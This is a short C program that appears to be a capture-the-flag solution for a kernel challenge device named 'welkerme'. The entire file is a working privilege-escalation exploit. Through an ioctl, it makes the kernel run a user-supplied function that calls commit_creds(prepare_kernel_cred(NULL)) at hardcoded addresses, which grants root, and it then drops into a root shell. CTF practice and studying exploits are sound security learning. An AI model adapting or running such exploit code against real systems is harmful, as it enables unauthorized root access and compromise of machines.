#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

int (*commit_creds)(void *) = 0xffffffff81072540;
void *(*prepare_kernel_cred)(void *) = 0xffffffff810726e0;

int func(void)
{
  return commit_creds(prepare_kernel_cred(NULL));
}

int main(void)
{
  int fd, ret;

  if ((fd = open("/dev/welkerme", O_RDWR)) < 0)
  {
    perror("/dev/welkerme");
    exit(1);
  }

  ret = ioctl(fd, CMD_ECHO, 12345);
  printf("CMD_ECHO(12345) --> %d\n", ret);

  ret = ioctl(fd, CMD_EXEC, (long)func);
  printf("CMD_EXEC(func) --> %d\n", ret);

  system("sh");

  close(fd);
  return 0;
}
